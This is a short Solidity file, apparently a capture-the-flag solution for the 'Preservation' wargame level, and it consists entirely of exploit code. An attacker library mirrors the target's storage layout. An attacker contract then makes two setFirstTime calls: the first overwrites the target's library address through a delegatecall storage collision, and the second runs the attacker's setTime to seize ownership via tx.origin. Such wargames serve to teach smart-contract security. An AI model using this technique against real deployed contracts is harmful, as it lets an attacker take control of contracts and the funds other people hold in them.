pragma solidity ^0.8.21;

interface IPreservation {
  function setFirstTime(uint _timeStamp) external;
}

contract PreservationAttackerLib {
  // set storage slows the same as Preservation (i.e. owner at slot 2)
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;

  function setTime(uint _time) public {
    owner = tx.origin;
  }
}

contract PreservationAttacker {
  IPreservation public challenge;
  PreservationAttackerLib public attackerLib;

  constructor(address _challengeAddress) {
    challenge = IPreservation(_challengeAddress);
    attackerLib = new PreservationAttackerLib();
  }

  function attack() external {
    // convert address -> uint160 -> uint256
    uint256 attackerLibAddressUint = uint256(uint160(address(attackerLib)));
    // sets the timeZone1Library to PreservationAttackerLib address
    challenge.setFirstTime(attackerLibAddressUint);
    // makes Preservation call PreservationAttackerLib to claim contract
    challenge.setFirstTime(1);
  }
}
